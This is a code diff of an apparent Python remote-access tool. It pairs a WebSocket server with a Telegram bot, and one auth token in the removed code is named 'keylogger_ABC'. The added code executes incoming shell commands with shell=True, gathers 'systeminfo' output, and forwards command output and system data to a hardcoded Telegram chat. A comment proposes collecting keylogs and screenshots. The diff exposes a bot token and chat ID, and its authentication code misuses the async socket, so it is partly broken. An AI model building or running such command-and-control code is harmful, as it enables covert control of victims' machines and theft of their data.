@@ -8,175 +8,92 @@ from datetime import datetime
 from collections import deque
 
 # Telegram Bot Configuration
-BOT_TOKEN = '7333847070:AAFUwJpWNvTZTQLVIsbcCicJZlWAmqFFNa4'  # Replace with your Telegram bot API token
-CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"  # Replace with your Telegram chat ID
+BOT_TOKEN = '7333847070:AAFUwJpWNvTZTQLVIsbcCicJZlWAmqFFNa4'
+CHAT_ID = '7416312733'
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Log file path
-LOG_FILE = "logs/logs.txt"
-clients = {}  # Store clients as {address: websocket}
-command_history = deque(maxlen=100)  # Keeps last 100 commands
+# Server Configuration
+PORT = 10000
+VALID_TOKENS = {"token123", "secureToken456", "clientABC789"}
 
-# Authentication
-VALID_TOKENS = {"secure_token123", "auth_payload456", "keylogger_ABC"}
+# WebSocket Clients
+clients = set()
 
-# --- File Handling ---
-# Save data to a file
-def save_to_file(filename, data):
-    os.makedirs(os.path.dirname(filename), exist_ok=True)
-    with open(filename, 'a') as file:
-        file.write(data + '\n')  # Append data with a newline
-    print(f"Data saved to {filename}")
+# Command history
+command_history = deque(maxlen=100)
 
-# Read data from a file
-def read_file(filename):
-    if os.path.exists(filename):
-        with open(filename, 'r') as file:
-            return file.read()
-    return "No data available."
-
-# --- Telegram Bot Commands ---
-# Start command
-@bot.message_handler(commands=['start'])
-def start_command(message):
-    bot.send_message(
-        message.chat.id,
-        "Hello! I am your advanced server bot.\n\n"
-        "Commands:\n"
-        "/getlogs - View logs\n"
-        "/getclients - See active clients\n"
-        "/sendmessage - Send message to clients\n"
-        "/exec - Execute commands remotely\n"
-        "/restart - Restart server"
-    )
-
-# Get logs
-@bot.message_handler(commands=['getlogs'])
-def get_logs(message):
-    logs = read_file(LOG_FILE)
-    bot.send_message(message.chat.id, f"📜 Logs:\n{logs}")
-
-# Get active clients
-@bot.message_handler(commands=['getclients'])
-def get_clients(message):
-    if clients:
-        client_list = "\n".join([f"{addr}" for addr in clients.keys()])
-        bot.send_message(message.chat.id, f"🟢 Active Clients:\n{client_list}")
-    else:
-        bot.send_message(message.chat.id, "❌ No active clients connected.")
-
-# Send a message to a specific client
-@bot.message_handler(commands=['sendmessage'])
-def send_message_to_client(message):
+# Authentication Process
+def authenticate(client_socket):
     try:
-        parts = message.text.split(" ", 2)
-        client_address = parts[1]
-        msg_content = parts[2]
-
-        if client_address in clients:
-            asyncio.run(clients[client_address].send(json.dumps({
-                "command": "message",
-                "result": msg_content,
-                "timestamp": str(datetime.now())
-            })))
-            bot.send_message(message.chat.id, f"✅ Message sent to client {client_address}")
-        else:
-            bot.send_message(message.chat.id, f"❌ No client found with address {client_address}")
-    except IndexError:
-        bot.send_message(message.chat.id, "❌ Invalid command format. Use /sendmessage client_address your_message_here")
-
-# Execute remote commands on a client
-@bot.message_handler(commands=['exec'])
-def execute_command(message):
-    try:
-        parts = message.text.split(" ", 2)
-        client_address = parts[1]
-        command = parts[2]
-
-        if client_address in clients:
-            asyncio.run(clients[client_address].send(json.dumps({
-                "command": "execute",
-                "result": command,
-                "timestamp": str(datetime.now())
-            })))
-            bot.send_message(message.chat.id, f"✅ Command sent to client {client_address}: {command}")
-        else:
-            bot.send_message(message.chat.id, f"❌ No client found with address {client_address}")
-    except IndexError:
-        bot.send_message(message.chat.id, "❌ Invalid command format. Use /exec client_address command_here")
-
-# Restart the server
-@bot.message_handler(commands=['restart'])
-def restart_server(message):
-    bot.send_message(message.chat.id, "🔄 Restarting the server...")
-    os.execv(sys.executable, ['python'] + sys.argv)
-
-# Send a message to Telegram
-def send_to_telegram(data):
-    bot.send_message(CHAT_ID, f"🔔 New Update: {data}")
-
-# Run Telegram Bot
-def run_bot():
-    print("Telegram Bot started...")
-    bot.polling()
-
-# --- WebSocket Server ---
-async def handler(websocket, path):
-    clients[websocket.remote_address] = websocket
-    print(f"Client connected: {websocket.remote_address}")
-    send_to_telegram(f"🟢 New client connected: {websocket.remote_address}")
-
-    # Authentication Process
-    try:
-        await websocket.send(json.dumps({"command": "auth", "result": "Please authenticate with your token."}))
-        auth_message = await websocket.recv()
+        # Send an authentication request
+        client_socket.send(json.dumps({"command": "auth", "result": "Please authenticate with your token."}))
+        auth_message = client_socket.recv(1024)
         auth_data = json.loads(auth_message)
-
         if auth_data.get("command") == "auth" and auth_data.get("result") in VALID_TOKENS:
-            await websocket.send(json.dumps({"command": "auth", "result": "Authentication successful."}))
-            print(f"Client {websocket.remote_address} authenticated successfully.")
-            send_to_telegram(f"🟢 Client {websocket.remote_address} authenticated successfully.")
-        else:
-            await websocket.send(json.dumps({"command": "auth", "result": "Authentication failed."}))
-            print(f"Client {websocket.remote_address} failed to authenticate.")
-            send_to_telegram(f"❌ Client {websocket.remote_address} failed authentication.")
-            return
+            return True
+        return False
+    except Exception as e:
+        return False
+
+# Execute shell commands and get output
+def execute_command(command):
+    try:
+        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+        return result.decode()
+    except subprocess.CalledProcessError as e:
+        return f"Error: {e.output.decode()}"
+
+# Send message to Telegram Bot
+def send_to_telegram(message):
+    bot.send_message(CHAT_ID, message)
+
+# WebSocket Handler
+async def handler(websocket, path):
+    clients.add(websocket)
+    print(f"Client connected: {websocket.remote_address}")
+
+    if authenticate(websocket):
+        await websocket.send(json.dumps({"command": "auth", "result": "Authentication successful."}))
+        send_to_telegram(f"🟢 New client connected: {websocket.remote_address}")
+        print(f"Client {websocket.remote_address} authenticated successfully.")
 
         async for message in websocket:
             data = json.loads(message)
-            formatted_data = f"Command: {data['command']}, Result: {data['result']}, Timestamp: {data['timestamp']}"
-            print(f"Received: {formatted_data}")
+            if data['command'] == 'exec':
+                output = execute_command(data['result'])
+                await websocket.send(json.dumps({"command": "output", "result": output, "timestamp": str(datetime.now())}))
+                send_to_telegram(f"📩 Command executed on {websocket.remote_address}:\n{data['result']}\nOutput: {output}")
+            elif data['command'] == 'data':
+                # Collect data (e.g., system info, logs)
+                # You can expand this with other types of data collection (keylogs, screenshots, etc.)
+                system_info = subprocess.check_output("systeminfo", shell=True).decode()
+                await websocket.send(json.dumps({"command": "data", "result": system_info, "timestamp": str(datetime.now())}))
+                send_to_telegram(f"📩 Data from {websocket.remote_address}:\n{system_info}")
+            else:
+                await websocket.send(json.dumps({"command": "error", "result": "Unknown command"}))
+    else:
+        await websocket.send(json.dumps({"command": "auth", "result": "Authentication failed."}))
+        send_to_telegram(f"❌ Client {websocket.remote_address} failed authentication.")
 
-            save_to_file(LOG_FILE, formatted_data)
-            send_to_telegram(f"📩 New data received:\n{formatted_data}")
+    clients.remove(websocket)
+    print(f"Client disconnected: {websocket.remote_address}")
 
-            # Add to command history
-            command_history.append(formatted_data)
-
-            # Forward the message to all connected clients
-            for client in clients.values():
-                if client != websocket:
-                    await client.send(json.dumps(data))
-    except Exception as e:
-        print(f"Error with client {websocket.remote_address}: {e}")
-        send_to_telegram(f"❌ Error with client {websocket.remote_address}: {e}")
-    finally:
-        del clients[websocket.remote_address]
-        print(f"Client disconnected: {websocket.remote_address}")
-        send_to_telegram(f"❌ Client disconnected: {websocket.remote_address}")
-
-# Start WebSocket server
+# Start WebSocket Server
 async def start_server():
-    port = int(os.getenv("PORT", 10000))
-    print(f"WebSocket Server started on ws://0.0.0.0:{port}")
-    server = await websockets.serve(handler, "0.0.0.0", port)
+    server = await websockets.serve(handler, "0.0.0.0", PORT)
     await server.wait_closed()
 
-# Run everything together
+# Run Telegram Bot
+def run_bot():
+    bot.polling()
+
 if __name__ == "__main__":
     import threading
+
+    # Run Telegram bot in a separate thread
     bot_thread = threading.Thread(target=run_bot)
     bot_thread.daemon = True
     bot_thread.start()
 
+    # Start WebSocket server
     asyncio.run(start_server())
